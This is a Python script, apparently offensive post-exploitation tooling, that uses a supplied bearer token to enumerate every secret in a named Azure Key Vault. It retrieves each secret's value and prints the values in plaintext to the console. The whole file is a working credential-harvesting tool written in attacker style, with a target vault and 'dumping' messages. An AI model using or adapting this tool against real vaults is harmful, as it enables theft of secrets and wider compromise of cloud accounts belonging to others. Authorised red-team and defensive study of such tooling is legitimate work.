import argparse
import requests

def parse_arguments():
    parser = argparse.ArgumentParser(description='Azure Key Vault Secret Dumper')
    parser.add_argument('--vault-name', required=True, help='Name of the Key Vault')
    parser.add_argument('--vault-token', required=True, help='Bearer token for Key Vault access')
    return parser.parse_args()

def setup_headers(vault_token):
    """Set up request headers with the provided token"""
    return {
        "Authorization": f"Bearer {vault_token}",
        "Content-Type": "application/json"
    }

def dump_keyvault_secrets(vault_name, headers):
    """Dump all secrets from the specified Key Vault"""
    print(f"[*] Dumping secrets from Key Vault: {vault_name}")
    url = f"https://{vault_name}.vault.azure.net/secrets?api-version=7.3"
    
    r = requests.get(url, headers=headers)
    if not r.ok:
        print(f"[!] Failed to list secrets for {vault_name}: {r.status_code} - {r.reason}")
        print(f"    Response: {r.text}")
        return False
    
    secrets = r.json().get("value", [])
    if not secrets:
        print("[!] No secrets found in the vault")
        return True
    
    print(f"[+] Found {len(secrets)} secrets")
    for sec in secrets:
        secret_name = sec["id"].split("/")[-1]
        sec_url = f"https://{vault_name}.vault.azure.net/secrets/{secret_name}?api-version=7.3"
        sec_val = requests.get(sec_url, headers=headers)
        
        if sec_val.ok:
            secret_value = sec_val.json().get("value", "")
            print(f"  [+] {secret_name} = {secret_value}")
        else:
            print(f"  [!] Failed to get value for {secret_name}: {sec_val.status_code} - {sec_val.reason}")
    
    return True

if __name__ == "__main__":
    args = parse_arguments()
    
    print("[*] Starting Azure Key Vault secret dumping...")
    print(f"[*] Target vault: {args.vault_name}")
    
    try:
        # Set up headers with the provided token
        headers = setup_headers(args.vault_token)
        
        # Dump secrets from the vault
        if dump_keyvault_secrets(args.vault_name, headers):
            print("\n[*] Key Vault secret dumping completed successfully!")
        else:
            print("\n[!] Failed to dump Key Vault secrets.")
    except Exception as e:
        print(f"\n[!] An error occurred during execution: {str(e)}")